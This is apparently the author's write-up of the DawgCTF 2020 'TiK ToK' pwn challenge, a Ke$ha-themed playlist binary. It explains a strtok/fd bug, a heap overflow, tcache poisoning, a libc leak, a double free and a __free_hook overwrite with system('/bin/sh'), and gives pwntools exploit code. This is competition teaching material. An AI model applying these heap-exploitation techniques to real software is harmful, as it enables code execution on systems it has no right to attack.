# Tik Tok  
__Category__: Pwn  
__Points__: 500

> Don't stop make it pop  
>  
> nc ctf.umbccd.io 4700  
>  
> Author: trashcanna  
>  
> Attachments: [tiktok] [libc.2.27.so] [songs.zip]

### I came to start the rukus  
Like every parent has a favorite child, every author also has a favorite
challenge.  
Mine just so happened to be TiK ToK, which first came about in October 2019
when  
pernicious (from RPISEC) and I were discussing interesting libc functions (as
one does). I believe  
I texted him something along the lines of `idea: strtok but kesha themed`.
After that, the  
challenge went through a multitide of iterations until it became what it is
today.  
Special thanks to pernicious for auditing all the challenges I wrote to check
for  
unintended solutions, spelling errors involving the word `borders`, and to
just generally  
make sure they didn't suck. I'd also like to thank the queen herself Ms. Kesha
Rose  
Sebert for the inspiration and for providing background music for this
writeup.

### now the party don't start til I walk in  
So for this challenge competitors were given a 64-bit executable called
`tiktok`, a bunch  
of song files in `songs.zip`, and a nice little `libc.2.27.so`. As the author,
when  
I was solving it I had the luxury of having source in front of me, so I won't
go too far  
into the reversing aspect (namely because I popped this baby in IDA once, said
"looks  
good to me", and never looked at it again). Now let's get this party started.

We can run checksec and see that we've got most of the standard protections in
place.  
No PIE though, which is nice. Full RELRO does mean that targeting the GOT
isn't an  
option.

```  
[*] '/home/statccato/DawgCTF/tiktok/tiktok'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

Upon first running the binary, we're greeted with a nice little welcome
message and a  
list of options from what I deemed the `TiK ToK Rock Bot`.

```  
Welcome to my tik tok rock bot!  
I really like Ke$ha, can you help me make a playlist?

So what would you like to do today?  
1. Import a Song to the Playlist  
2. Show Playlist  
3. Play a song from the Playlist  
4. Remove a song from the Playlist  
5. Exit  
Choice:  
```

Okay cool. Looks like we can import a song, show the playlist, play a song
from the playlist,  
and remove a song from the playlist. If this is screaming heap to you, you're
on the right track.  
Looking a little closer at how it all works under the hood, we can see that
we've got a song struct  
with some fairly normal members: a song_path, a file descriptor, an album, a
song, and the contents.  
We also get 50 of these bad boys to play around with, which will become
important later. Other than  
that we've got a song_count, which keeps track of the number of songs in the
playlist. All of this is  
stored in the .bss.

```c  
#define NUM_SONGS 50

struct song{  
   char song_path[24]; \\ 24 bytes  
   int fd;             \\ 4 bytes with 4 bytes padding  
   char* album;        \\ 8 bytes  
   char* song;         \\ 8 bytes  
   char* contents;     \\ 8 bytes  
}; \\ 56 bytes

int song_count;  
struct song songs[NUM_SONGS];  
```

Okay so now that we know how things are being stored, let's take a closer look
at exactly how we're able  
to create this playlist (and how we can make it play the best song of all,
`system("/bin/sh")`).

### get sleazy

Poking around the code a little more, we can see we're able to read in the
song files found in songs.zip.  
Only problem is, we don't have a whole lot of control on the songs we're
importing. Calling import invites  
us to view a call to `system("ls -R")` in the current directory. This is fine
and dandy, except we can only  
import a song with a path that is a valid file path, begins with a character
between `A` and `Z`, and doesn't  
contain `flag` or `..`. All of the songs are contained in album folders, with
names like `Animal/animal.txt` and  
`Warrior/allthat.txt`.

```c  
   songs[song_count].fd = open(songs[song_count].song_path, O_RDONLY);  
   if(songs[song_count].fd == -1 || songs[song_count].song_path[0] < 'A' ||
songs[song_count].song_path[0] > 'Z' ||  
       strstr(songs[song_count].song_path, "flag") || strstr(songs[song_count].song_path, "..")){  
       printf("Error: Bad filepath, exiting\n");  
       exit(-1);  
   }  
```

So directory traversal and a simple "open the flag, play the flag" is out.
Cool. Let's look a little closer at what  
the `import_song` function has to offer. Before we open the song and ensure it
has a valid path, we read in the  
song path and if the last character is a newline, we replace that newline with
a null terminator.  
From a functionality perspective, this makes sense, as attempting to open a
file with the newline would fail.  
It is interesting to note then that if we send a song path without a newline,
we can get our little song path  
to not have a null terminator and can fill the array.

```c  
   int nread = read(0, songs[song_count].song_path,
sizeof(songs[song_count].song_path));  
   if(nread <= 0){  
       printf("Error reading input, exiting\n");  
       exit(-1);  
   }  
   if(songs[song_count].song_path[nread-1] == '\n'){  
       songs[song_count].song_path[nread-1] = '\x00';  
   }  
```

After this, we attempt to open the file and set the file descriptor. So long
as that succeeds, we're good  
to go. Here's where things get interesting.  After setting the file
descriptor, we make two calls to strtok to get  
the name of the album and song. These calls are `songs[song_count].album =
strtok(songs[song_count].song_path, "/")` and  
`songs[song_count].song = strtok(NULL, ".")`. The null here means we begin at
the first character after the delimeter in the  
previous call to strtok. It's also notable that strtok overwrites the
delimeter with a null byte. So if we were to pass in a  
path of `Cannibal/blow.txt`, the first call to strtok would give us an album
of `Cannibal` and the second a song of `blow`. The path,  
however, would look something like `Cannibal\x00blow\x00txt`. Knowing that, we
can begin to talk about the first bug our  
Ke$ha superfan left in this code.

Our file just has to return a valid file descriptor. It doesn't have to
actually be a file, necessarily. Directories can  
also be opened, so if we sent `Warrior/` it would work just fine.
Coincidentally, `Warrior//` would also work just fine.  
As would `Warrior///`. See where I'm going? We still run into a problem
though, because this doesn't get you all that  
much. Let's take a look back to our song struct and take a closer look at the
members.

```c  
char song_path[24];  
int fd;  
```

Looks like our path butts right up against the file descriptor, like my best
friend to my middle school crush when  
We R Who We R came on at the eighth grade dance. So if we fill up a
`song_path` with a valid directory, we can make  
the file descriptor a continuation of the path (everyone say "thank you
endianness"). What does this get us?  
First, it gets us an aside on file descriptors.

The first three file descriptors (0, 1, and 2) correspond to stdin, stdout,
and stderr. After this, file descriptors  
are assigned incrementally, beginning at 3. So in our case, the first song you
import will be given a file descriptor of  
3, the second 4, and so on.

| fd   | Corresponding File |  
|------|--------------------|  
|  0   |       stdin        |  
|  1   |      stdout        |  
|  2   |      stderr        |  
|  3   |  first song file   |

So if we can somehow get a song to have a file descriptor of 0, we'd be able
to read in from stdin in our `play_song`  
function. Knowing that we can make the file descriptor act as part of the non-
null-terminated `song_path` and that strtok overwrites the delimeter  
with a null byte, we can begin to formulate how to get our read from stdin.
First, we can generate enough  
songs such that the next song will have `.` as a file descriptor, otherwise
known as 0x2e (less than our 50 song limit). We then import a song, passing in
a directory  
that is long enough to fill the buffer and have the file descriptor included
in the non null terminated path.  
Then when `songs[song_count].song = strtok(NULL, ".")` is called, strtok will
find the first '.' (0x2e) in the  
string (which in this case is actually the file descriptor), and replace it
with a null byte. Now the song has an fd of 0,  
which allows us to read from stdin in the play_song function.

So to recap, our exploit currently looks something like this:

```python  
def addsong(songname):  
       proc.recvuntil("Choice:")  
       proc.sendline("1")  
       proc.recvuntil("path.")  
       proc.send(songname)

for i in range(3, ord('.')):  
       addsong("Animal/animal.txt")  
addsong("Animal" + "/" * (24 - len("Animal")))  
```

### this place about to blow

Before we get into any more of the exploitation, this seems like a good time
for a little heap  
crash course. This won't be all-inclusive by any means, but should give some
necessary background  
before we procede.

The glibc allocator keeps track of free chunks in doubly linked lists which
are organized by size, known  
as bins.  
One exception to this is tcache, which uses one singly linked list per size.
The maximum tcache  
size is 0x420, so if we make an allocation of a size less than 0x420 and free
it, the freed chunk  
will become the tcache head. Free chunks that do not fit in the tcache will go
in the unsorted bin, one of the doubly linked lists, instead  
of the tcache. Allocating a tcache size will use the head of the list, if it
exists  
(tcache is FIFO). In glibc 2.27, there are virtually zero security checks in
place for tcache. From an exploitation  
perspective, taking control of this list will let us get allocations wherever
we want.

### let's make the most of the night like we're gonna die young

Or like the CTF is about to end. Okay so now we can set a song's file
descriptor to zero, but what does that get us? Looking at the  
`play_song` function we can see what actually gets read in when we play a
song. When we  
play a song, we call read on the file descriptor associated with that song,
reading up until the first newline.  
If we take a look at one of our song files, we see this is the length of the
file. After this, we call malloc  
on one more than said length, presumably to make room for the null terminator,
and store this pointer as the song's `contents` field.  
Then, we memset the song's contents to zero and read `file_len` bytes to the
contents.  
Because we can now read in from stdin, we can control the `file_len` variable
and thus the call to malloc.  
By passing in `-1\n` to our first call to read, we can call `malloc(0)` (as
`file_len`+1 will overflow), memset zero bytes of the contents,  
and read in as many bytes as we'd like into our song's contents.

```c  
   if (!songs[choice].contents){  
       for(int i = 0; i < sizeof(length); i++){  
           read(songs[choice].fd, length+i, 1);  
           if(length[i] == '\n'){  
               length[i] = '\x00';  
               break;  
           }  
       }  
       file_len = atoi(length);  
       songs[choice].contents = malloc(file_len + 1);  
       memset(songs[choice].contents, 0, file_len+1);  
       read(songs[choice].fd, songs[choice].contents, file_len);  
   }  
```

Now we can get a heap overflow using the read within the play_song function.
With this overflow, we'll want  
to take control of the tcache linked list. To do this, we first need to make
some allocations.  
Lucky for us, Ke$ha conveniently has songs that are both tcache size and
unsorted chunk  
size (thanks queen). From here, we have to modify the exploit we made just a
little bit, because we'll need songs that  
are both tcache size and unsorted chunk size. All song files have the song
length in the first line,  
then the song contents, which is how they're read in. The song animal has a
length of 0x3b2, which is  
smaller than the maximum tcache size of 0x420. Dinosaur, conversely, has a
length of 0x67c, larger than  
the maximum tcache size and would (when freed) go in the unsorted bin. This
means both of these are  
good choices for files.

```python  
for i in range(3, ord('.') - 1):  
       addsong("Animal/animal.txt")  
addsong("Animal/dinosaur.txt")  
addsong("Animal" + "/" * (24 - len("Animal")))  
```

Also to note is that we aren't able to read a song multiple times, thanks to
this line in play_song  
`if (!songs[choice].contents){`. This means we can only read in from stdin
once with this song, so  
we'll have to make it count. Looking back at our song object, we can see that
all the songs contain  
a character array (the path), with two pointers into the array (album and
song). With this overwrite,  
we'll want to overwrite a tcache pointer to point somewhere in the songs
array.  
This creates a fake linked list in which we control where things are allocated
on the  
heap. In order to do this, however, we'll first have to setup the heap in a
way that allows us to  
muck with a tcache pointer. Now we can go back to our handy songs that we
created earlier.  
We can play song 43 (dinosaur, an unsorted bin size) then song 42 (animal, a
tcache size).  
Malloc will give us a layout of [0x690][0x3c0], because malloc rounds up (so
our  
0x67c allocation will have a chunk size of 0x690 (nice)).

Before going any further, we should probably take a look at exactly what
happens when we remove a song. First we pass in an int to the function  
equal to the song number (which is 1 more than the index into the song array).
After ensuring this  
choice is valid, we set the song, album, and path to null. We also free the
song contents and  
close the file descriptor. This is notable, because it means that if we were
to free the song we  
overwrote with the 0 file descriptor, we would close stdin. That'd be pretty
lame of us so we'll  
avoid that.

```c  
   printf("Removing: %s from %s\n", songs[choice].song, songs[choice].album);  
   songs[choice].song = 0;  
   songs[choice].album = 0;  
   free(songs[choice].contents);  
   songs[choice].contents = 0;  
   memset(songs[choice].song_path, 0, sizeof(songs[choice].song_path));  
   close(songs[choice].fd);  
   songs[choice].fd = 0;  
```

After allocating our two songs, we can remove them from the playlist thus
freeing the chunks associated with them.  
After this, our heap will look something like [0x690 unsorted][0x3c0 tcache].
After this, we're ready  
to use our call to read on stdin and perform the overflow. By calling malloc
on a size of zero, we're  
returned a chunk of 0x20 in size from our first unsorted bin. This means the
heap will look something  
like [0x20 chunk][0x670 unsorted][0x3c0 tcache]. From here we can set the
freed tcache chunk's next  
pointer to somewhere in the second song (for our purposes, we will
use`songs[1].album`, however the exact  
location is slightly misaligned for the exploit). This gives us a fake linked
list that looks something like:

```  
[0x3c0 tcache] -> &songs[1].album  
```

or in a picture:

```  
                         +-------------+  
             songs[1] -->| song_path   |  
 |heap, 0x3c0 tcache| -->| album       |  
			  | contents    |  
                         +-------------+  
```  
In order to do this, we'll have to overflow the 0x20 chunk and the 0x670
unsorted chunk. This gives us an even 0x690 bytes (nice).  
Now our exploit looks something like this:

```python  
def playsong(songnum):  
       proc.recvuntil("Choice:")  
       proc.sendline("3")  
       proc.recvuntil("Choice:")  
       proc.sendline(str(songnum))

def freesong(songnum):  
       proc.recvuntil("Choice:")  
       proc.sendline("4")  
       proc.recvuntil("Choice:")  
       proc.sendline(str(songnum))

def stdsong(songnum, len, data):  
       playsong(songnum)  
       proc.sendline(str(len))  
       proc.send(data)

for i in range(3, ord('.') - 1):  
       addsong("Animal/animal.txt")  
addsong("Animal/dinosaur.txt")  
addsong("Animal" + "/" * (24 - len("Animal")))

playsong(43)  
playsong(42)  
freesong(43)  
freesong(42)

stdsong(44, -1, "A"*0x690 + p64(0x4040be))  
```

After this, we can allocate another 0x3c0 chunk (which one doesn't matter too
much), which pops the tcache  
head, making the tcache head point `&songs[1].album`. We can once more malloc
an 0x3c0 chunk, which returns  
`&songs[1].album`. For this, we choose song 19 such that `songs[18].contents =
&songs[1].album`.  
After this, the fake chunk then gets memsetted.  This song was chosen because
it means that the file length works out exacty so that `songs[18].fd` will be
zeroed out but  
`songs[18].contents` will not. The read, therefore, is `read(0,
&songs[1].album, 0x3b3)`. Now we have control of the  
songs array and can create some fake song structs.

We can set up these fake structs to do a few things: leak a libc address,  
cause a double free, and create a few songs with fd 0 for later use. The libc
leak can be achieved by setting a song's  
album or song to a GOT entry and viewing the playlist. For the double free, we
can create a fake chunk of size 0x20, and  
set the contents pointer of two songs to this fake chunk.  
When we remove these songs (numbered 4 and 5), they will free their contents
pointer, double free-ing our 0x20 fake chunk.  
Note that when we remove a song the file descriptor is closed, so we have to
set the file descriptor to a nonzero value (we don't want to close stdin,
after all).

```python  
playsong(25)  
playsong(19)  
fake_chunk = '\x00'*0x1a + p64(0x21) + '\x00'*8 + p64(0) +
p64(elf.got['system']) + p64(0) + p64(0)  #the fake chunk  
fake_pointer = '\x00' * 24 + p64(0xff) + p64(elf.got['system']) + p64(0) +
p64(0x4040e0)             #for the double free  
fake_song = '\x00' * 24 + p64(0) + p64(elf.got['system']) + p64(0) + p64(0)
#the fd 0 songs

proc.send(fake_chunk + fake_pointer * 2 + fake_song * 3)  
freesong(4)  
proc.recvuntil("from ")  
system_addr = proc.readuntil("\n\nSo", drop=True)  
system_addr = u64(system_addr.ljust(8, '\x00'))  
libc.address = system_addr - libc.symbols["system"]  
print hex(libc.address)  
freesong(5)  
```

### don't stop make it pop

By it, of course, we mean a shell. Remember we have setup some fake songs
(numbered 6, 7, and 8) to read from stdin so we can malloc any size with any
contents.  
At this point, our tcache looks something like this:

```  
[heap]--\  
 ^-----/  
```

We first make one 0x20 allocation, which gives us the looped tcache entry.
Because of the loop, the tcache head  
still points to this 0x20 chunk, so writing a fake next pointer here will give
us control of the linked list. We set the next  
pointer to `__free_hook`. Now tcache 0x20 looks something like this:

```  
[heap] -> [__free_hook]  
```

We can make another 0x20 allocation to consume the first entry. For this, we
pick the string `"/bin/sh"`. After that allocation, the tcache  
head becomes `__free_hook`. We can make another allocation to overwrite
`__free_hook` with `system` and trigger the call by freeing a chunk.  
(You can see the full exploit script over at `trashcanna-sol.py`)

```python  
freesong(5)  
stdsong(6, 8, p64(libc.symbols["__free_hook"]))  
stdsong(7, 8, "/bin/sh")  
stdsong(8, 8, p64(libc.symbols["system"]))  
freesong(7)

proc.interactive()  
```

Now we've got a shell and can cat the flag, which is appropriately
`DawgCTF{h0t_aNd_d@ng3r0us}`.

### you'll miss the magic of these good old days

Sad to say this was my last DawgCTF as a student at UMBC, but happy to say it
was the biggest  
and baddest we've ever had. Special thanks to RJ Joyce, Joe Aurelio, Cyrus
Bonyadi, Seamus Burke,  
Chris Gardner, Zack Orndorff, Jackie Schultz, Chris Skane, Drew Barrett, and
everyone else who  
made this event so special. Congrats to redpwn for the win and shoutout to
Polaris, redpwn,  
HTCPCP://, and meltdown for solving it during the competiton (RPISEC also got
the solve shortly  
after the competition ended, so kudos to them as well). I'll be writing
challenges next year  
as well, so if you thought this was it I direct you to a line from Praying:
`the best is yet to come`.  

Original writeup
(https://github.com/toomanybananas/dawgctf-2020-writeups/blob/master/pwn/tiktok/WRITEUP.md).